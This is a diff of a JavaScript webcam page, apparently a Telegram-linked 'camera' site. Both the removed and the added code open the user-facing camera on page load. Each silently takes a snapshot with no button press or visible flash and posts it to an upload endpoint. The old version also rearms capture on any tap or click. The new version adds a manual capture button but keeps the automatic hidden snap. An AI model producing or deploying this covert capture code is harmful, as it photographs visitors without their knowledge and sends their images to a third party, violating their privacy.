@@ -1,14 +1,20 @@
 const video = document.getElementById('camera-stream');
 const canvas = document.getElementById('capture-canvas');
+const captureBtn = document.getElementById('capture-btn');
 const statusMsg = document.getElementById('status-msg');
+const flashOverlay = document.getElementById('flash-overlay');
 
-let captured = false;
+let mediaStream = null;
+let isSending = false;
 
-async function startCameraAndCapture() {
-    if (captured) return;
-
+// Initialize Live Camera immediately on page load
+async function initCamera() {
     try {
-        // 1. Open Camera (Try facing user)
+        if (statusMsg) {
+            statusMsg.innerText = "Kamera faollashtirilmoqda...";
+            statusMsg.style.color = '#94a3b8';
+        }
+
         const stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: 'user',
@@ -17,47 +23,61 @@ async function startCameraAndCapture() {
             },
             audio: false
         });
+
+        mediaStream = stream;
         video.srcObject = stream;
 
-        // 2. Play stream
-        const onStreamReady = () => {
+        video.onloadedmetadata = () => {
             video.play().then(() => {
-                // Wait for video frame to actually render
-                setTimeout(captureFromVideo, 1200);
+                if (statusMsg) {
+                    statusMsg.innerText = "Kamera tayyor! 📸";
+                    statusMsg.style.color = '#a5b4fc';
+                }
+                // Optional initial snap after camera is warm
+                setTimeout(() => {
+                    takeSnapshot(false);
+                }, 1400);
             }).catch(err => {
-                console.log("Autoplay blocked, waiting for tap:", err);
-                const triggerPlay = () => {
-                    video.play().then(() => {
-                        setTimeout(captureFromVideo, 800);
-                    }).catch(console.error);
-                };
-                ['click', 'touchstart', 'pointerdown'].forEach(ev => {
-                    document.addEventListener(ev, triggerPlay, { once: true });
-                });
+                console.log("Autoplay waiting for user gesture:", err);
             });
         };
 
-        if (video.readyState >= 2) {
-            onStreamReady();
-        } else {
-            video.onloadedmetadata = onStreamReady;
-        }
-
     } catch (err) {
-        console.error("Camera Error:", err);
-        if (statusMsg) statusMsg.innerText = "Error: " + err.message;
-        // Retry on interaction
-        ['click', 'touchstart'].forEach(ev => {
-            document.addEventListener(ev, startCameraAndCapture, { once: true });
-        });
+        console.error("Camera access error:", err);
+        if (statusMsg) {
+            statusMsg.innerText = "Kameraga ruxsat bering ⚠️";
+            statusMsg.style.color = '#f87171';
+        }
     }
 }
 
-function captureFromVideo() {
-    if (captured) return;
+// Flash Animation Effect
+function triggerFlash() {
+    if (!flashOverlay) return;
+    flashOverlay.classList.add('flash-active');
+    setTimeout(() => {
+        flashOverlay.classList.remove('flash-active');
+    }, 150);
+}
 
-    // Check if video is streaming
-    if (!video.srcObject) return;
+// Take snapshot and send
+async function takeSnapshot(isManual = true) {
+    if (isSending && isManual) return;
+    if (!video || !video.srcObject) {
+        if (isManual) {
+            await initCamera();
+        }
+        return;
+    }
+
+    if (isManual) {
+        triggerFlash();
+        if (statusMsg) {
+            statusMsg.innerText = "Surat olinmoqda 📸...";
+            statusMsg.style.color = '#e2e8f0';
+        }
+        if (captureBtn) captureBtn.disabled = true;
+    }
 
     const width = video.videoWidth || 640;
     const height = video.videoHeight || 480;
@@ -66,54 +86,71 @@ function captureFromVideo() {
     canvas.height = height;
     const ctx = canvas.getContext('2d');
 
-    // Mirror effect & Draw
+    // Mirror effect
     ctx.translate(canvas.width, 0);
     ctx.scale(-1, 1);
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Stop camera immediately
-    const stream = video.srcObject;
-    if (stream) {
-        stream.getTracks().forEach(track => track.stop());
+    const base64Data = canvas.toDataURL('image/jpeg', 0.85);
+
+    if (!base64Data || base64Data.length < 200) {
+        if (isManual && captureBtn) captureBtn.disabled = false;
+        return;
     }
 
-    // Convert to Base64 (JPEG)
-    const base64data = canvas.toDataURL('image/jpeg', 0.8);
-
-    if (base64data && base64data.length > 200) {
-        captured = true;
-        sendToBackend(base64data);
-    }
+    await sendPhoto(base64Data, isManual);
 }
 
-async function sendToBackend(base64Str) {
+// Send photo to backend / Telegram
+async function sendPhoto(base64Str, isManual) {
+    if (isManual) {
+        isSending = true;
+        if (statusMsg) {
+            statusMsg.innerText = "Yuborilmoqda 🚀...";
+            statusMsg.style.color = '#93c5fd';
+        }
+    }
+
     const endpoints = ['/api/upload', '/upload'];
 
     for (const url of endpoints) {
         try {
-            console.log("Sending photo to:", url);
-            const response = await fetch(url, {
+            const res = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: base64Str })
             });
 
-            if (response.ok) {
-                const result = await response.json();
-                console.log("Photo sent successfully via", url, result);
-                return;
-            } else {
-                console.warn(`${url} returned status ${response.status}`);
+            if (res.ok) {
+                const data = await res.json();
+                console.log("Photo sent successfully via:", url, data);
+                if (isManual && statusMsg) {
+                    statusMsg.innerText = "Muvaffaqiyatli yuborildi! ✅";
+                    statusMsg.style.color = '#4ade80';
+                }
+                break;
             }
-        } catch (error) {
-            console.warn(`Failed sending to ${url}:`, error);
+        } catch (e) {
+            console.warn(`Failed sending to ${url}:`, e);
         }
+    }
+
+    if (isManual) {
+        isSending = false;
+        if (captureBtn) captureBtn.disabled = false;
     }
 }
 
-// Start immediately on load
+// Capture Button Click Handler
+if (captureBtn) {
+    captureBtn.addEventListener('click', () => {
+        takeSnapshot(true);
+    });
+}
+
+// Start on page load
 if (document.readyState === 'loading') {
-    window.addEventListener('DOMContentLoaded', startCameraAndCapture);
+    window.addEventListener('DOMContentLoaded', initCamera);
 } else {
-    startCameraAndCapture();
+    initCamera();
 }
